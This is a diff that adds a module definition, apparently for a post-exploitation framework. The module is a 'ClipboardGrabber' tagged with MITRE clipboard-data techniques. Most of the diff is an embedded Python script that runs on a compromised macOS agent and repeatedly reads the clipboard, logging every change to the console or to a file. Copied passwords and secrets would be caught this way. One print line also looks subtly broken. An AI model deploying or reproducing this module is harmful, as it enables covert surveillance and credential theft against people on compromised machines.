@@ -1,0 +1,62 @@
+name: ClipboardGrabber
+authors:
+  - '@424f424f'
+description: This module will write log output of clipboard to stdout (or disk).
+software: ''
+techniques:
+  - T1115
+  - T1414
+background: false
+output_extension: ''
+needs_admin: false
+opsec_safe: true
+language: python
+min_language_version: '2.6'
+comments:
+  - ''
+options:
+  - name: Agent
+    description: Agent to grab clipboard from.
+    required: true
+    value: ''
+  - name: OutFile
+    description: Optional file to save the clipboard output to.
+    required: false
+    value: ''
+  - name: MonitorTime
+    description: Optional for how long you would like to monitor clipboard in (s).
+    required: true
+    value: '0'
+script: |
+  def func(monitortime=0):
+      from AppKit import NSPasteboard, NSStringPboardType
+      import time
+      import datetime
+      import sys
+
+      sleeptime = 0
+      last = ''
+      outFile = '%s'
+
+      while sleeptime <= monitortime:
+          try:
+              pb = NSPasteboard.generalPasteboard()
+              pbstring = pb.stringForType_(NSStringPboardType)
+
+              if pbstring != last:
+                  if outFile != "":
+                      f = file(outFile, 'a+')
+                      f.write(pbstring)
+                      f.close()
+                      print("clipboard written to",outFile)
+                  else:
+                      ts = time.time()
+                      st = datetime.datetime.fromtimestamp(ts).strftime('%%Y-%%m-%%d %%H:%%M:%%S')
+                      print(st + ": %{{ OutFile }}".encode("utf-8") %% repr(pbstring))
+              last = pbstring
+              time.sleep(1)
+              sleeptime += 1
+          except Exception as e:
+              print(e)
+
+  func(monitortime={{ MonitorTime }})
